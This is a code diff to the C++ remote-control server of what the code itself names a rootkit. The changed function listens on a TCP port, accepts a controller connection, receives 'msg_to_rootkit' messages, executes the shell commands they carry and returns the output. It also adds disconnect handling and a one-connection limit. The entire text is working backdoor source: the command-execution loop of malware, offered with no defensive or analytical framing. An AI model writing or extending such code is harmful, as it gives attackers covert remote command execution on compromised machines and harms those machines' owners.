@@ -1,7 +1,3 @@
-//
-// Created by idan on 12/30/23.
-//
-
 #include <thread>
 #include <iostream>
 #include <unistd.h>
@@ -30,35 +26,57 @@ void remote_control_server::run() {
     // assign the connection establisher for the listener
     my_listener.setConnectionEstablisher(generate_tcp_port_connection_establisher(my_port));
 
-    std::thread listen_thread(&linux_server::listen, &my_listener);
+    int no_connections = 0;
+
+    std::thread listen_thread([&my_listener, &no_connections]() {
+        while (1) {
+            if (no_connections >= 1) break; // todo: if the remove controller is expected to connect more than once, don't break here and keep looping
+
+            std::cout << "waiting for a client..." << std::endl;
+            my_listener.accept_next_client();
+            no_connections++;
+
+            std::cout << "client connection established" << std::endl;
+
+            while (my_listener.is_client_connected()) {
+                sleep(1);
+            }
+
+            std::cout << "client connection closed" << std::endl;
+
+        }
+    });
     while (true) {
         while (!my_listener.is_client_connected()) {
+            if (no_connections >= 1) goto stop_server; // todo: same with here
             sleep(1);
         }
+
+        const std::unique_ptr<basic_client_handler>& client = my_listener.get_connected_client();
+        if (client == nullptr) continue;
 
         // get command
         struct msg_to_rootkit msg;
         memset(&msg, '\x00', sizeof(struct msg_to_rootkit));
-//        if (my_listener.recv_next_data(reinterpret_cast<char *>(&msg), sizeof(struct msg_to_rootkit)) !=
-//            sizeof(struct msg_to_rootkit)) {
-//            std::cout << "message wasn't fully received" << std::endl;
-//            continue;
-//        }
-//        my_listener.recv_next_data(reinterpret_cast<char *>(&msg), sizeof(struct msg_to_rootkit));
-        my_listener.get_connected_client()->recv_data(reinterpret_cast<char *>(&msg),
+        client->recv_data(reinterpret_cast<char *>(&msg),
                                                       sizeof(struct msg_to_rootkit));
-        std::cout << "received message" << std::endl;
+        std::cout << "received message: ";
 
         R_OPER id = msg.id;
         char *data = msg.data;
 
-        switch (id) { // currently supports only commands to run in cli shell, todo change
+        switch (id) {
+            case R_OPER_DISCONNECT: {
+                std::cout << "client is disconnecting" << std::endl;
+                my_listener.close_curr_client();
+                continue;
+            }
             case R_OPER_EXEC_SHELL_COMMAND: {
                 std::cout << "client shell command: " << data << std::endl;
 
                 // execute
                 std::string output = execute_cli_shell_command(data);
-                std::cout << "command output" << std::endl;
+                std::cout << "command output:" << std::endl;
                 std::cout << output << std::endl;
 
                 // send the command's output back to linux_client
@@ -69,7 +87,6 @@ void remote_control_server::run() {
                 my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(&msg_back),
                                                               sizeof(struct msg_to_controller));
 
-                std::cout << "sent output back" << std::endl;
                 break;
             }
             default: {
@@ -78,6 +95,12 @@ void remote_control_server::run() {
             }
         }
 
+    }
+
+    stop_server:
+    {
+        listen_thread.detach();
+        stop();
     }
 }
 
